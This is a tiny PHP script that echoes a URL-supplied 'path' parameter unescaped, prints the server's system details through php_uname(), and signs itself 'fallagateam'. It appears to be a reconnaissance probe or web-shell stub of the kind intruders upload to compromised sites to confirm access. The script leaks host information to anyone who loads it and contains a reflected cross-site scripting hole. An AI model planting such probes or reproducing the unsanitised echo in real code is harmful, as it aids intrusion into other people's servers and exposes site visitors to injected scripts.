<?php
if(isset($_GET['path'])){
    $path = $_GET['path'];   
}else{
    $path = getcwd();
}

    echo 'path:'.$path.'';

echo '<b><br>uname:'.php_uname().'<br></b>fallagateam';

?>